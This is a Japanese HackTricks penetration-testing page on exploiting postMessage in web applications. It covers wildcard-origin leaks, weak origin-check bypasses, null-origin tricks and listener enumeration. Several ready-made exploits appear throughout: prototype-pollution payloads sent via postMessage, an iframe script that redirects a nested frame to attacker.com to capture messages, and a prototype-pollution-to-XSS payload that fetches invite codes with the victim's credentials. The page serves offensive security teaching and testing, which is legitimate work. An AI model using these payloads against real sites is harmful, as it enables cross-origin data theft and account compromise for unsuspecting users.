# PostMessageの脆弱性

## PostMessageの脆弱性

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## **PostMessage**の送信

**PostMessage**は、次の関数を使用してメッセージを送信します：
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
注意してください。**targetOrigin**は'\*'または_https://company.com_のようなURLである場合があります。\
**2番目のシナリオ**では、**メッセージはそのドメインにのみ送信**されます（ウィンドウオブジェクトのオリジンが異なっていても）。\
ワイルドカードが使用される場合、**メッセージは任意のドメインに送信**され、ウィンドウオブジェクトのオリジンに送信されます。

### iframeとワイルドカードを使用した攻撃

[**このレポート**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)で説明されているように、**X-Frame-Header**の保護がない**iframe**で表示できるページを見つけ、ワイルドカード（\*）を使用して**postMessage**を介して**機密情報**を送信している場合、**iframe**の**origin**を**変更**して、機密情報を自分が制御するドメインに**漏洩**させることができます。\
ただし、ページがiframeで表示できるが、**targetOrigin**が**URLに設定されていてワイルドカードではない**場合、このトリックは**機能しません**。
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListenerの悪用

**`addEventListener`**は、JSが`postMessage`を期待している関数を宣言するために使用される関数です。\
以下のようなコードが使用されます。
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
この場合、コードが最初に行っているのは**オリジンのチェック**です。これは非常に**重要**です。特に、ページが受け取った情報を何かしらの機密な操作（パスワードの変更など）に使用する場合には重要です。**オリジンのチェックが行われていない場合、攻撃者は被害者に任意のデータをエンドポイントに送らせ、被害者のパスワードを変更することができます**（この例では）。

### 列挙

現在のページで**イベントリスナーを見つける**ためには、以下の方法があります：

* JSコード内で`window.addEventListener`と`$(window).on`（JQueryバージョン）を**検索**する
* 開発者ツールのコンソールで次のコマンドを**実行**する：`getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* ブラウザの開発者ツールで_Elements --> Event Listeners_に**移動**する

![](<../../.gitbook/assets/image (617).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta)や[https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)のような**ブラウザ拡張機能**を使用する。これらのブラウザ拡張機能は、**すべてのメッセージを傍受**し、表示します。

### オリジンの基本的なバイパスのチェック

* もし、PostMessageイベントの**オリジン**をチェックするために**`indexOf()`**が使用されている場合、次の例のように簡単にバイパスされることに注意してください：`("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")`\\
* もし、**`search()`**が**オリジン**を検証するために使用されている場合、安全ではない可能性があります。`String.prototype.search()`のドキュメントによると、このメソッドは文字列ではなく正規表現オブジェクトを受け取ります。正規表現以外のものが渡されると、それは暗黙的に正規表現に変換されます。\
正規表現では、**ドット（.）はワイルドカードとして扱われます**。攻撃者はこれを利用して、公式のドメインではなく**特別なドメイン**を使用して検証をバイパスすることができます。例えば、`"https://www.safedomain.com".search("www.s.fedomain.com")`のようにです。\\
* もし、**`escapeHtml`**関数が使用されている場合、この関数は`new`でエスケープされたオブジェクトを作成するのではなく、既存のオブジェクトのプロパティを**上書き**します。つまり、`hasOwnProperty`に応答しない制御可能なプロパティを持つオブジェクトを作成できれば、エスケープされません。
```javascript
// Expected to fail:
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
`File`オブジェクトは、読み取り専用の`name`プロパティを持っているため、テンプレートで使用され、`escapeHtml`関数をバイパスするのに最適です。

### e.origin == window.originのバイパス

ページが`<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`を介して**サンドボックス化されたiframe**に埋め込まれると、その**iframe**の**オリジン**は**`null`**になります。

**sandboxの値が`allow-popups`に設定**されている場合、**開かれたポップアップ**は、`allow-popups-to-escape-sandbox`が設定されていない限り、すべての**サンドボックス属性**を**継承**します。\
したがって、**nullのオリジン**から**ポップアップ**を開くと、ポップアップ内の**`window.origin`**も**`null`**になります。

したがって、ポップアップを許可するサンドボックス化されたiframeを開き、そのiframe内からポップアップを開き、iframeからポップアップにpostMessageを送信すると、両方のオリジンはnullになるため、**`e.origin == window.origin == null`**です。

詳細については、以下を参照してください：

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.sourceのバイパス

**postMessage**を送信し、**すぐに削除**される**iframe**を作成することで、メッセージの**`e.source`**をnullに強制することができます。

詳細については、以下を参照してください：

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Headerのバイパス

これらの攻撃を実行するためには、理想的には被害者のウェブページを`iframe`内に配置できることが望ましいです。ただし、`X-Frame-Header`などの一部のヘッダーは、そのような動作を**防止**することがあります。\
そのようなシナリオでは、より目立たない攻撃を使用することができます。脆弱なウェブアプリケーションに新しいタブを開き、それと通信することができます：
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### メインページのブロックによる子への送信メッセージの盗み出し

以下のページでは、**メイン**ページを送信データを送る前に**ブロック**し、**子のiframe**に送信される**機密のpostmessageデータ**を盗み出す方法を示しています。そして、**子のXSSを悪用**してデータが受信される前にデータを**漏洩**させます。

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframeの場所を変更してメッセージを盗み出す

もし、X-Frame-Headerを持たないウェブページに別のiframeが含まれている場合、その子のiframeの**場所を変更**することができます。そのため、**ワイルドカード**を使用して送信された**postmessage**を受信している場合、攻撃者はそのiframeの**オリジン**を自分が**制御するページ**に**変更**し、メッセージを**盗み出す**ことができます。

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### Prototype Pollutionおよび/またはXSSへのpostMessage

`postMessage`を介して送信されるデータがJSによって実行されるシナリオでは、**ページをiframe化**し、`postMessage`を介してエクスプロイトを送信することで、**プロトタイプ汚染/XSS**を悪用することができます。

**非常に詳しく説明されたXSSの例**は、[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)で見つけることができます。

`postMessage`を介して`iframe`に**Prototype Pollutionを悪用し、その後XSSを行う**エクスプロイトの例：
```markup
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**詳細情報**については以下を参照してください：

* [**プロトタイプ汚染**](../deserialization/nodejs-proto-prototype-pollution/)に関するページへのリンク
* [**XSS**](../xss-cross-site-scripting/)に関するページへのリンク
* [**クライアント側のプロトタイプ汚染からXSSへ**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)に関するページへのリンク

## 参考文献

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* 練習用：[https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
